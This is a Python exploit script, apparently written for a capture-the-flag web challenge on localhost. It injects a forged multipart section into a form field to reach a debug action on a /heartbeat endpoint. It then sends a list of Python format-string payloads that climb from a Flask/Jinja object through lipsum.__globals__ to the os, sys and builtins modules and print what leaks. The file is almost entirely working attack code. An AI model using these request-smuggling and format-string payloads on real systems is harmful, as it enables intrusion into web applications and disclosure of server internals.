import httpx

TARGET = "http://127.0.0.1:5000"
BOUNDARY = "---------------------------FlagBoundary123"

def format_string_leak(payload):
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    
    text = payload + fake_action_part
    params = {
        'text': text,
        'client': 'Content-Type',
        'token': f'multipart/form-data; boundary={BOUNDARY}'
    }
    
    r = httpx.post(f"{TARGET}/heartbeat", data=params, timeout=5.0)
    return r.text.strip()

# 探索 sys 模块
payloads = [
    # sys 模块通过 os 访问
    ('{0.jinja_env.globals[lipsum].__globals__[os].sys}', 'os.sys'),
    
    # 通过 __builtins__ 的 __loader__ 找 sys
    ('{0.jinja_env.globals[lipsum].__globals__[__builtins__][__spec__]}', 'builtins spec'),
    
    # 检查 threading
    ('{0.jinja_env.globals[lipsum].__globals__}', 'check for sys in globals'),
    
    # werkzeug 可能有有用信息
    ('{0.jinja_env.globals[lipsum].__globals__[__loader__]}', 'loader'),
    ('{0.jinja_env.globals[lipsum].__globals__[__spec__]}', 'spec'),
    ('{0.jinja_env.globals[lipsum].__globals__[__spec__].loader}', 'spec loader'),
    
    # 检查 pprint
    ('{0.jinja_env.globals[lipsum].__globals__[pprint]}', 'pprint'),
]

for p, desc in payloads:
    try:
        result = format_string_leak(p)
        result = result[:3000] if len(result) > 3000 else result
        print(f"[{desc}]: {result}\n")
    except Exception as e:
        print(f"[{desc}]: Error - {e}\n")
